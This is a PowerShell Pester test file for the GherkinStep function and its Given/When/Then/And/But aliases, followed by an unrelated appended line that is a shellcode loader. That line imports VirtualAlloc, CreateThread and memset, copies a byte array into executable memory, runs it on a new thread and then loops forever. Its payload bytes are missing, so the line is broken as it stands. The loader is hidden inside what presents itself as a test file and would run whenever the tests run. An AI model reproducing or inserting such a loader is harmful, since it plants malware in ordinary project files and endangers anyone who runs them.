Set-StrictMode -Version Latest

Describe 'Testing Gherkin Step' -Tag Gherkin {
    It 'Generates a function named "GherkinStep" with mandatory name and test parameters' {
        $command = &(Get-Module Pester) { Get-Command GherkinStep -Module Pester }
        $command | Should -Not -Be $null

        $parameter = $command.Parameters['Name']
        $parameter | Should -Not -Be $null

        $parameter.ParameterType.Name | Should -Be 'String'

        $attribute = $parameter.Attributes | Where-Object { $_.TypeId -eq [System.Management.Automation.ParameterAttribute] }
        $isMandatory = $null -ne $attribute -and $attribute.Mandatory

        $isMandatory | Should -Be $true

        $parameter = $command.Parameters['Test']
        $parameter | Should -Not -Be $null

        $parameter.ParameterType.Name | Should -Be 'ScriptBlock'

        $attribute = $parameter.Attributes | Where-Object { $_.TypeId -eq [System.Management.Automation.ParameterAttribute] }
        $isMandatory = $null -ne $attribute -and $attribute.Mandatory

        $isMandatory | Should -Be $true
    }
    It 'Generates aliases Given, When, Then, And, But for GherkinStep' {
        $command = &(Get-Module Pester) { Get-Alias -Definition GherkinStep | Select -Expand Name }
        $command | Should -Be "And", "But", "Given", "Then", "When"
    }
    It 'Populates the GherkinSteps module variable' {
        When "I Click" { }
        & ( Get-Module Pester ) { $GherkinSteps.Keys -eq "I Click" } | Should -Be "I Click"
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

